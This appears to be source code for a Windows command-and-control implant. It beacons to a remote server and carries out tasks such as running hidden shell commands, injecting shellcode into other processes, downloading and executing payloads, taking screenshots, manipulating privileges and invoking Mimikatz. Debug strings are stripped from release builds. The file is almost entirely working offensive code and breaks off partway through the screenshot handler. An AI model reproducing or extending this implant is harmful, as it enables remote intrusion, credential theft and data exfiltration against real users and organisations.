#pragma once

#define WIN32_LEAN_AND_MEAN
#define CMD_TIMEOUT 10000
#define _CRT_SECURE_NO_WARNINGS

int SLEEP_TIME = 10;

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <ws2tcpip.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <TlHelp32.h>
#include <intsafe.h>
#include <sstream>
#include <fstream>
#include <string>
#include <vector>
#include <iomanip>
#include <stdexcept>
#include <winnt.h>
#include <shellapi.h>

#pragma comment(lib, "Shell32.lib") // CommandLineToArgvW
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib") // for getInternalIP()

#include "config.hpp"
#include "base64.hpp"
#include "json.hpp"
#include "sRDI.hpp"
#include "screenshot.hpp"

#ifdef _DEBUG
#define VERBOSE 1 // Allows the (helpful) output during Debug builds
#define MAIN main(VOID)
#else
#define VERBOSE 0 // Disables output via macros and, as a result, removes those static strings from the compiled binary
#define MAIN WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#endif

// Use macros to prevent output/static strings from appearing in Release builds:
#pragma warning(disable: 4002) // Disables warning: too many arguments for function-like macro invocation 'PRINTF'
#pragma warning(disable: 4002) // Disables warning: too many arguments for function-like macro invocation 'PRINTF'
#if VERBOSE
#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
#define CERR(x) std::cerr << x
#define COUT(x) std::cout << x
#define WCOUT(x) std::wcout << x
#else
#define PRINTF(X)
#define CERR(x)
#define COUT(x) 
#define WCOUT(x)
#endif

using json = nlohmann::json;

std::string sendRequest(const std::string& jsonData);
std::string getNextTask(const std::string& agent_id);
void sendTaskResult(const std::string &agent_id, const std::string &task_id, int status, const std::string &result);
void handleTask(const std::string &agent_id, const std::string &taskID,
	int taskType, const std::string &taskInput, const std::string &fileID);

// Specific handlers
void handlePs(const std::string &agent_id, const std::string &taskID);
std::string getProcessList();
bool InjectShellcode(DWORD pid, const BYTE* shellcode, size_t shellSize);
void handleScInject(const std::string &agent_id, const std::string &taskID,
	const std::string &taskInput, const std::string &fileID);
void handleShell(const std::string &agent_id, const std::string &taskID, const std::string &taskInput);
void handleDownload(const std::string &agent_id, const std::string &taskID,
	const std::string &taskInput, const std::string &fileID);
void handleUpload(const std::string &agent_id, const std::string &taskID, const std::string &taskInput);
void handleTerminate(const std::string &agent_id, const std::string &taskID);
void handlePwd(const std::string &agent_id, const std::string &taskID);
void handleCd(const std::string &agent_id, const std::string &taskID, const std::string &taskInput);
void handleWhoami(const std::string &agent_id, const std::string &taskID);
void handleListPrivs(const std::string &agent_id, const std::string &taskID, const std::string &fileID);
void handleSetPriv(const std::string &agent_id, const std::string &taskID, const std::string &taskInput, const std::string &fileID);
void handleSS(const std::string &agent_id, const std::string &taskID, const std::string &fileID);
void handleSleep(const std::string &agent_id, const std::string &taskID, const std::string &taskInput);
void handleMimikatz(const std::string &agent_id, const std::string &taskID, const std::string &taskInput, const std::string &fileID);
void setJitter(int sleepTime, int jitterMax, int jitterMin);
void getMachineGUID(WCHAR* guid, DWORD bufferSize);
std::string getInternalIP();


//---------------------------------------------------------------------
std::string sendRequest(const std::string& jsonData) {
	HINTERNET hInternet = InternetOpenA("C2 Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) {
		PRINTF("[-] InternetOpenA failed!\n");
		return "";
	}

	HINTERNET hConnect = InternetConnectA(hInternet, SERVER, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		PRINTF("[-] InternetConnectA failed!\n");
		InternetCloseHandle(hInternet);
		return "";
	}

	const char* headers = "Content-Type: application/json";
	DWORD headerSize;
	SIZETToDWord(strlen(headers), &headerSize);
		

	// Encode and wrap the JSON data
	std::string encodedJson = base64_encode(jsonData);
	std::string wrappedJson = "{ \"d\": \"" + encodedJson + "\" }";

	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/send", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
	if (!hRequest) {
		PRINTF("[-] HttpOpenRequestA failed!\n");
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return "";
	}

	DWORD wjSize;
	SIZETToDWord(wrappedJson.size(), &wjSize);
	BOOL sent = HttpSendRequestA(hRequest, headers, headerSize, (LPVOID)wrappedJson.c_str(), wjSize);
	if (!sent) {
		PRINTF("[-] HttpSendRequestA failed!\n");
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return "";
	}

	// Now read in a loop
	std::stringstream responseStream;
	const size_t BUFSZ = 8192;
	char buffer[BUFSZ] = { 0 };
	DWORD bytesRead = 0;
	BOOL success = TRUE;

	do {
		success = InternetReadFile(hRequest, buffer, BUFSZ, &bytesRead);
		if (!success || bytesRead == 0) break;
		responseStream.write(buffer, bytesRead);
	} while (true);


	// Clean up
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	// Convert the entire stream to a string
	return responseStream.str();
}



//---------------------------------------------------------------------
std::string getNextTask(const std::string &agent_id) {
	json inner;
	inner["agent_id"] = agent_id;
	std::string innerStr = inner.dump();

	json outer;
	outer["ht"] = 2; // GetNextTask
	outer["data"] = base64_encode(innerStr);

	return sendRequest(outer.dump());
}

//---------------------------------------------------------------------
void sendTaskResult(const std::string &agent_id, const std::string &task_id, int status, const std::string &result) {
	json inner;
	inner["agent_id"] = agent_id;
	inner["id"] = task_id;
	inner["status"] = status;
	inner["result"] = result;

	std::string innerStr = inner.dump();

	json outer;
	outer["ht"] = 3; // TaskResult
	outer["data"] = base64_encode(innerStr);

	std::string final = sendRequest(outer.dump());
	PRINTF("%s\n", final.c_str());
}

//---------------------------------------------------------------------
void handleTask(const std::string &agent_id, const std::string &taskID,
	int taskType, const std::string &taskInput, const std::string &fileID) {
	PRINTF("[DEBUG] Task: %s %s %d %s %s\n",
		agent_id.c_str(), taskID.c_str(), taskType, taskInput.c_str(), fileID.c_str());
	switch (taskType) {
	case 1:
		handleTerminate(agent_id, taskID);
		break;
	case 2:
		handleShell(agent_id, taskID, taskInput);
		break;
	case 3:
		handlePwd(agent_id, taskID);
		break;
	case 4:
		handleCd(agent_id, taskID, taskInput);
		break;
	case 5:
		handleWhoami(agent_id, taskID);
		break;
	case 6:
		handlePs(agent_id, taskID);
		break;
	case 7:
		handleDownload(agent_id, taskID, taskInput, fileID);
		break;
	case 8:
		handleUpload(agent_id, taskID, taskInput);
		break;
	case 9:
		handleListPrivs(agent_id, taskID, fileID);
		break;
	case 10:
		handleSetPriv(agent_id, taskID, taskInput, fileID);
		break;
	case 11:
		handleScInject(agent_id, taskID, taskInput, fileID);
		break;
	case 12:
		handleSS(agent_id, taskID, fileID);
		break;
	case 13:
		handleSleep(agent_id, taskID, taskInput);
		break;
	case 14:
		handleMimikatz(agent_id, taskID, taskInput, fileID);
		break;
	default:
		sendTaskResult(agent_id, taskID, 6, "");
		break;
	}
}

//---------------------------------------------------------------------
void handlePs(const std::string &agent_id, const std::string &taskID) {
	std::string psTable = getProcessList();
	std::string b64Result;
	int status = 5;

	if (psTable.find("Error") == std::string::npos) {
		status = 4;
		b64Result = base64_encode(psTable);
		PRINTF("[+] Completed task: ps\n[+] Sending back success code (4) with results...\n");
	}
	else {
		PRINTF("[-] Unable to complete task: ps\n[+] Sending back error code (5)...\n");
	}

	sendTaskResult(agent_id, taskID, status, b64Result);
}

//---------------------------------------------------------------------
std::string getProcessList() {
	std::stringstream ss;
	ss << std::left << std::setw(8) << "PID"
		<< std::setw(8) << "Parent"
		<< std::setw(6) << "Arch"
		<< std::setw(20) << "User"
		<< "ProcessName" << "\n";
	ss << "-------------------------------------------------------------\n";

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		ss << "Error: Unable to create snapshot.\n";
		return ss.str();
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnap, &pe32)) {
		CloseHandle(hSnap);
		ss << "Error: Process32First failed.\n";
		return ss.str();
	}

	bool adminStatus = (isUserAdmin()) ? TRUE : FALSE;

	do {
		DWORD pid = pe32.th32ProcessID;
		DWORD ppid = pe32.th32ParentProcessID;
		std::string arch = getPIDArch(pid);
		std::string username = "";
		if (adminStatus) {
			// username = getPIDUsername(pid);
		}
		std::string exeFile = pe32.szExeFile;

		ss << std::left << std::setw(8) << pid
			<< std::setw(8) << ppid
			<< std::setw(6) << arch
			<< std::setw(20) << username
			<< exeFile << "\n";

	} while (Process32Next(hSnap, &pe32));

	CloseHandle(hSnap);
	return ss.str();
}

//---------------------------------------------------------------------
bool InjectShellcode(DWORD pid, const BYTE* shellcode, size_t shellSize) {
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		FALSE, pid);
	if (!hProcess) {
		PRINTF("[-] Failed to open target process (PID %d).\n", pid);
		return false;
	}

	LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!remoteMemory) {
		PRINTF("[-] VirtualAllocEx failed.\n");
		CloseHandle(hProcess);
		return false;
	}

	BOOL writeResult = WriteProcessMemory(hProcess, remoteMemory, shellcode, shellSize, NULL);
	if (!writeResult) {
		PRINTF("[-] WriteProcessMemory failed.\n");
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)remoteMemory,
		NULL, 0, NULL);
	if (!hThread) {
		PRINTF("[-] CreateRemoteThread failed.\n");
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, 500);
	CloseHandle(hThread);
	VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	return true;
}

//---------------------------------------------------------------------
void handleScInject(const std::string &agent_id, const std::string &taskID,
	const std::string &taskInput, const std::string &fileID) {
	DWORD targetPID = static_cast<DWORD>(stoi(taskInput));

	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;  // DownloadStart
	DownloadStart["data"] = base64_encode(start.dump());

	std::string startcheck = sendRequest(DownloadStart.dump());
	json startData = json::parse(startcheck);

	std::string chunk = startData.at("chunk");
	PRINTF("[DEBUG] chunk (base64): %s\n", chunk.c_str());

	std::string rawShellcode = base64_decode(chunk);
	size_t shellSize = rawShellcode.size();
	BYTE* shellcodeBuf = new BYTE[shellSize];
	memcpy(shellcodeBuf, rawShellcode.data(), shellSize);

	bool success = InjectShellcode(targetPID, shellcodeBuf, shellSize);
	Sleep(500);
	delete[] shellcodeBuf;

	if (success) {
		sendTaskResult(agent_id, taskID, 4, "");
	}
	else {
		sendTaskResult(agent_id, taskID, 5, "Injection failed");
	}
}

//---------------------------------------------------------------------
void handleShell(const std::string &agent_id, const std::string &taskID, const std::string &taskInput) {
	BOOL ok = TRUE;
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	if (!ok) {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] Unable to create input pipe.\n[+] Sending back error code (5)...\n");
		return;
	}

	ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
	if (!ok) {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] Unable to create output pipe.\n[+] Sending back error code (5)...\n");
		return;
	}

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;

	PROCESS_INFORMATION pi = { 0 };

	std::wstring lpCommandLine = std::wstring(L"cmd.exe /c ") + toWstring(taskInput);

	ok = CreateProcessW(NULL, (LPWSTR)lpCommandLine.c_str(), NULL, NULL,
		TRUE, 0, NULL, NULL, &si, &pi);

	if (!ok) {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] CreateProcessW failed.\n[+] Sending back error code (5)...\n");
		return;
	}

	if (WaitForSingleObject(pi.hProcess, CMD_TIMEOUT) == WAIT_TIMEOUT) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hStdOutPipeWrite);
		CloseHandle(hStdInPipeRead);
		sendTaskResult(agent_id, taskID, 6, "");
		PRINTF("[-] Process timed out.\n[+] Sending back error code (6)...\n");
		return;
	}

	CloseHandle(hStdOutPipeWrite);
	CloseHandle(hStdInPipeRead);

	char buf[1024 + 1] = { 0 };
	DWORD dwRead = 0;
	std::string output;

	ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	while (ok && dwRead > 0) {
		buf[dwRead] = '\0';
		output += buf;
		ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	}

	std::string b64Output = base64_encode(output);
	sendTaskResult(agent_id, taskID, 4, b64Output);

	CloseHandle(hStdOutPipeRead);
	CloseHandle(hStdInPipeWrite);

	DWORD dwExitCode = 0;
	GetExitCodeProcess(pi.hProcess, &dwExitCode);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	SecureZeroMemory(buf, sizeof(buf));
	PRINTF("[+] Task completed: shell\n[+] Sending back success code (4) with results...\n");
}

//---------------------------------------------------------------------
void handleDownload(const std::string &agent_id, const std::string &taskID,
	const std::string &taskInput, const std::string &fileID) {
	std::string dstPath = taskInput;

	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json downloadStart;
	downloadStart["ht"] = 7;
	downloadStart["data"] = base64_encode(start.dump());

	std::string startResponse = sendRequest(downloadStart.dump());
	if (startResponse.empty()) {
		sendTaskResult(agent_id, taskID, 5, "No response from server on DownloadStart");
		return;
	}

	json startData = json::parse(startResponse);
	if (!startData.contains("chunk")) {
		sendTaskResult(agent_id, taskID, 5, "Server response missing 'chunk'");
		return;
	}

	std::string chunkB64 = startData["chunk"];
	int next_chunk_id = startData.value("next_chunk_id", 0);

	std::string decodedChunk = base64_decode(chunkB64);
	std::ofstream clientFile(dstPath, std::ios::binary);
	if (!clientFile.is_open()) {
		sendTaskResult(agent_id, taskID, 5, "Failed to open local file");
		return;
	}
	clientFile.write(decodedChunk.c_str(), decodedChunk.size());
	clientFile.close();

	while (next_chunk_id != 0) {
		json chunkReq;
		chunkReq["ht"] = 8;
		json inner;
		inner["file_id"] = fileID;
		inner["chunk_id"] = next_chunk_id;
		chunkReq["data"] = base64_encode(inner.dump());

		std::string chunkResp = sendRequest(chunkReq.dump());
		if (chunkResp.empty()) {
			sendTaskResult(agent_id, taskID, 5, "Download chunk request failed");
			return;
		}

		json chunkRespJson = json::parse(chunkResp);
		if (!chunkRespJson.contains("chunk")) {
			sendTaskResult(agent_id, taskID, 5, "Missing 'chunk' in chunk response");
			return;
		}

		std::string nextChunkB64 = chunkRespJson["chunk"];
		next_chunk_id = chunkRespJson.value("next_chunk_id", 0);

		std::string nextChunk = base64_decode(nextChunkB64);
		std::ofstream outFile(dstPath, std::ios::binary | std::ios::app);
		if (!outFile.is_open()) {
			sendTaskResult(agent_id, taskID, 5, "Failed to open local file (append)");
			return;
		}
		outFile.write(nextChunk.c_str(), nextChunk.size());
		outFile.close();
	}

	json downloadEnd;
	downloadEnd["ht"] = 9;
	json endData;
	endData["task_id"] = taskID;
	endData["file_id"] = fileID;
	endData["agent_id"] = agent_id;
	endData["status"] = 4;

	downloadEnd["data"] = base64_encode(endData.dump());
	sendRequest(downloadEnd.dump());

	sendTaskResult(agent_id, taskID, 4, "");
	PRINTF("[+] File downloaded successfully to: %s\n", dstPath.c_str());
}

//---------------------------------------------------------------------
void handleUpload(const std::string &agent_id, const std::string &taskID, const std::string &taskInput)
{
	typedef unsigned char BYTE;
	const size_t CHUNK_SIZE = 1024 * 1024; // 1MB chunks

	// Open the file in binary to send
	std::ifstream file(taskInput, std::ios::binary | std::ios::ate);
	if (!file.is_open()) {
		PRINTF("[-] Failed to open file: %s\n", taskInput.c_str());
		return;
	}
	size_t filesize = file.tellg();
	PRINTF("[DEBUG] Uploading file: %s, size: %zu bytes\n", taskInput.c_str(), filesize);
	file.close();
	file.open(taskInput, std::ios::binary);
	if (!file.is_open()) {
		PRINTF("[-] Failed to open file: %s\n", taskInput.c_str());
		return;
	}

	// Send UploadStart (HT=4)
	json uploadStartData;
	uploadStartData["task_id"] = taskID;
	uploadStartData["content"] = "";
	uploadStartData["path"] = taskInput;

	// Wrap data
	json uploadStart;
	uploadStart["ht"] = 4; // UploadStart
	uploadStart["data"] = base64_encode(uploadStartData.dump());

	std::string startResponse = sendRequest(uploadStart.dump());
	PRINTF("startResponse: %s\n", startResponse.c_str());
	if (startResponse.find("error") != std::string::npos) {
		PRINTF("[-] UploadStart failed\n");
		file.close();
		return;
	}
	// Parse response for file_id
	json startJson = json::parse(startResponse);
	std::string fileId = startJson.at("id");
	std::vector<BYTE> buffer(filesize);
	file.read(reinterpret_cast<char*>(buffer.data()), filesize);

	size_t n = 0;
	while (!file.eof()) {
		size_t start = static_cast<size_t>(n) * CHUNK_SIZE;
		size_t end = start + CHUNK_SIZE;
		if (end > filesize) end = filesize;

		PRINTF("[DEBUG] Uploading chunk %d: bytes %d to %d\n", n, start, end);
		std::vector<BYTE> subvector(buffer.begin() + start, buffer.begin() + end);
		BYTE *b = subvector.data();
		std::string sbuf(reinterpret_cast<const char*>(b));

		json data;
		data["content"] = sbuf.c_str();
		data["file_id"] = fileId;

		json uploadData;
		uploadData["ht"] = 5;
		uploadData["data"] = base64_encode(data.dump());

		std::string uploadResponse = sendRequest(uploadData.dump());
		if (startResponse.find("error") != std::string::npos) {
			PRINTF("[-] Upload failed\n");
			file.close();
			return;
		}

		// while reading file until eof

			// Read the chunk in based on defined chunk size

			// if the chunk read > 0

				// json chunkData
				// encapsulate it with fileId and chunkID

				// encode the data into the "chunk"

				// json chunkUpload
				// ht and data to be encoded and sent

				// sendRequest(chunkUpload.dump())
				// error handling for failed upload


			// increment chunkID to read in next chunk of file

		// close reading the file
	}

	// Send UploadEnd (HT=6)
	json endData;
	endData["file_id"] = fileId;
	endData["task_id"] = taskID;
	endData["agent_id"] = agent_id;
	endData["status"] = 4; // Success status

	json uploadEnd;
	uploadEnd["ht"] = 6; // UploadEnd
	uploadEnd["data"] = base64_encode(endData.dump());

	std::string endResponse = sendRequest(uploadEnd.dump());
	PRINTF("[+] Upload completed successfully\n");
}

//---------------------------------------------------------------------
void handleTerminate(const std::string &agent_id, const std::string &taskID) {
	sendTaskResult(agent_id, taskID, 4, "");
	PRINTF("\n[*] Terminating session. Goodbye!\n");
}

//---------------------------------------------------------------------
void handlePwd(const std::string &agent_id, const std::string &taskID) {
	char pwd[1024] = { 0 };
	DWORD ret = GetCurrentDirectoryA(sizeof(pwd), pwd);
	if (ret == 0) {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] Unable to complete task: pwd\n[+] Sending back error code (5)...\n");
	}
	else {
		sendTaskResult(agent_id, taskID, 4, base64_encode(pwd));
		PRINTF("[+] Completed task: pwd\n[+] Sending back success code (4) with results...\n");
	}
}

//---------------------------------------------------------------------
void handleCd(const std::string &agent_id, const std::string &taskID, const std::string &taskInput) {
	BOOL ret = SetCurrentDirectoryA(taskInput.c_str());
	if (!ret) {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] Unable to complete task: cd\n[+] Sending back error code (5)...\n");
	}
	else {
		std::string msg = "Changed directory to: " + taskInput;
		sendTaskResult(agent_id, taskID, 4, base64_encode(msg));
		PRINTF("[+] Completed task: cd\n[+] Sending back success code (4) with results...\n");
	}
}

void handleWhoami(const std::string &agent_id, const std::string &taskID) {
	char whoami[256] = { 0 };
	DWORD whoamiSize = 256;
	BOOL ret = GetUserNameA(whoami, &whoamiSize);
	if (ret) {
		sendTaskResult(agent_id, taskID, 4, base64_encode(whoami));
	}
	else {
		sendTaskResult(agent_id, taskID, 5, "");
	}
}

//---------------------------------------------------------------------
// copied from Loader.cpp from ShellcodeRDI
//FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName) {
//	if (hModule == NULL || lpProcName == NULL)
//		return NULL;
//
//	PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
//	PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
//	if (!dataDir->Size)
//		return NULL;
//
//	PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
//	if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
//		return NULL;
//
//	PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
//	PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
//	LPCSTR expNameStr;
//
//	for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {
//		expNameStr = RVA(LPCSTR, hModule, *expName);
//		if (!expNameStr)
//			break;
//
//		if (!_stricmp(lpProcName, expNameStr)) {
//			DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
//			return RVA(FARPROC, hModule, funcRva);
//		}
//	}
//
//	return NULL;
//}

//---------------------------------------------------------------------
std::string executeShellcode(BYTE* execMem) {
	typedef LPWSTR(*DLLMAIN)(LPCWSTR, DWORD);
	DLLMAIN exec = (DLLMAIN)execMem;

	LPWSTR resultW = nullptr;
	std::string finalResult;

	try {
		resultW = exec(NULL, 0);

		if (resultW) {
			size_t wlen = wcsnlen(resultW, 8192);  // Safe upper bound
			if (wlen > 0 && wlen < 8192) {
				int len = WideCharToMultiByte(CP_UTF8, 0, resultW, (int)wlen, NULL, 0, NULL, NULL);
				if (len > 0) {
					// Allocate a std::string and convert the wide character string to UTF-8
					finalResult.resize(len);
					WideCharToMultiByte(CP_UTF8, 0, resultW, (int)wlen, &finalResult[0], len, NULL, NULL);
				}
			}
		}
	}
	catch (const std::exception& e) {
		PRINTF("[-] Exception while executing shellcode or processing output: %s\n", e.what());
	}

	return finalResult;
}

//---------------------------------------------------------------------
void handleListPrivs(const std::string &agent_id, const std::string &taskID, const std::string &fileID) {
	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;
	DownloadStart["data"] = base64_encode(start.dump());

	std::string startcheck = sendRequest(DownloadStart.dump());
	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());

	json startRet = json::parse(startcheck);
	int totalChunks = startRet.at("total");
	int nextChunkID = startRet.at("next_chunk_id");
	std::string listprivs = startRet.at("chunk");

	while (nextChunkID != 0) {
		json downloadChunk;
		downloadChunk["file_id"] = fileID;
		downloadChunk["chunk_id"] = nextChunkID;

		json wrapDownloadChunk;
		wrapDownloadChunk["ht"] = 8;
		wrapDownloadChunk["data"] = base64_encode(downloadChunk.dump());

		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());

		json chunkJ = json::parse(downloadChunkResponse);
		std::string newchunk = chunkJ.at("chunk");
		listprivs.append(newchunk);
		nextChunkID = chunkJ.at("next_chunk_id");
	}

	json endDownloadData;
	endDownloadData["task_id"] = taskID;
	endDownloadData["agent_id"] = agent_id;
	endDownloadData["status"] = 4;

	json endDownload;
	endDownload["ht"] = 9;
	endDownload["data"] = base64_encode(endDownloadData.dump());
	size_t shellSize = listprivs.size();

	std::string result;
	listprivs = base64_decode(listprivs);
	int ret = load_execute_listprivs(listprivs, result);
	if (ret == 0 && !result.empty()) {
		// Base64 encode the result to send to the CLI
		std::string encodedResult = base64_encode(result);
		sendTaskResult(agent_id, taskID, 4, encodedResult);
		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
	}
	else {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
	}
}

//---------------------------------------------------------------------
void handleSetPriv(const std::string &agent_id, const std::string &taskID, const std::string &taskInput, const std::string &fileID) {
	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;
	DownloadStart["data"] = base64_encode(start.dump());

	std::string startcheck = sendRequest(DownloadStart.dump());
	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());

	json startRet = json::parse(startcheck);
	int totalChunks = startRet.at("total");
	int nextChunkID = startRet.at("next_chunk_id");
	std::string setpriv = startRet.at("chunk");

	while (nextChunkID != 0) {
		json downloadChunk;
		downloadChunk["file_id"] = fileID;
		downloadChunk["chunk_id"] = nextChunkID;

		json wrapDownloadChunk;
		wrapDownloadChunk["ht"] = 8;
		wrapDownloadChunk["data"] = base64_encode(downloadChunk.dump());

		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());

		json chunkJ = json::parse(downloadChunkResponse);
		std::string newchunk = chunkJ.at("chunk");
		setpriv.append(newchunk);
		nextChunkID = chunkJ.at("next_chunk_id");
	}

	json endDownloadData;
	endDownloadData["task_id"] = taskID;
	endDownloadData["agent_id"] = agent_id;
	endDownloadData["status"] = 4;

	json endDownload;
	endDownload["ht"] = 9;
	endDownload["data"] = base64_encode(endDownloadData.dump());
	size_t shellSize = setpriv.size();

	std::string result;
	setpriv = base64_decode(setpriv);
	printf("%s\n", setpriv);
	std::string privset = taskInput;
	int ret = load_execute_setpriv(setpriv, privset, result);
	if (ret == 0 && !result.empty()) {
		// Base64 encode the result to send to the CLI
		std::string encodedResult = base64_encode(result);
		sendTaskResult(agent_id, taskID, 4, encodedResult);
		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
	}
	else {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
	}
	/*
	// Download the shellcode
	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;  // DownloadStart
	DownloadStart["data"] = base64_encode(start.dump());
	std::string startcheck = sendRequest(DownloadStart.dump());
	json startData = json::parse(startcheck);


	std::string chunk = startData.at("chunk");
	PRINTF("[DEBUG] chunk (base64): %s\n", chunk.c_str());

	// Decode the shellcode
	std::string rawShellcode = base64_decode(chunk);
	size_t shellSize = rawShellcode.size();
	std::string result;
	int ret = load_execute_listprivs(rawShellcode, result);
	if (ret == 0 && !result.empty()) {
		// Base64 encode the result to send to the CLI
		std::string encodedResult = base64_encode(result);
		sendTaskResult(agent_id, taskID, 4, encodedResult);
		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
	}
	else {
		sendTaskResult(agent_id, taskID, 5, "");
		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
	}
	*/
}

void handleGetAdmin(const std::string& agent_id, const std::string& taskID, const std::string& fileID) {

}

void handleSS(const std::string &agent_id, const std::string &taskID, const std::string &fileID)
{
	PRINTF("[DEBUG] Entered handleSS()\n");

	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;
	DownloadStart["data"] = base64_encode(start.dump());

	std::string startcheck = sendRequest(DownloadStart.dump());
	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());

	json endDownloadData;
	endDownloadData["task_id"] = taskID;
	endDownloadData["agent_id"] = agent_id;
	endDownloadData["status"] = 4;

	json endDownload;
	endDownload["ht"] = 9;
	endDownload["data"] = base64_encode(endDownloadData.dump());

	std::string endDownloadCheck = sendRequest(endDownload.dump());
	PRINTF("[DEBUG] DownloadEnd response: %s\n", endDownloadCheck.c_str());

	json startData = json::parse(startcheck);
	std::string shellcodeB64 = startData.at("chunk");

	std::string shellcode = base64_decode(shellcodeB64);
	PRINTF("[DEBUG] Shellcode decoded, size: %zu bytes\n", shellcode.size());

	std::wstring screenshotDataW;
	int result = load_execute_ss(shellcode, screenshotDataW);
	std::string screenshotData = toString(screenshotDataW);

	// Convert wide to narrow

	PRINTF("[DEBUG] load_execute_ss() result: %d\n", result);
	PRINTF("[DEBUG] Screenshot data size: %zu bytes\n", screenshotData.size());
	PRINTF("[DEBUG] Screenshot data content: %.200s\n", screenshotData.c_str());


	if (result == 0 && !screenshotData.empty()) {
		size_t n1 = 0;
		size_t n = 4096;
		if (n > screenshotData.size()) n = screenshotData.size();

		// Send UploadStart (HT=4)
		json uploadStartData;
		uploadStartData["task_id"] = taskID;
		uploadStartData["content"] = base64_encode(screenshotData.substr(n1, n - n1));
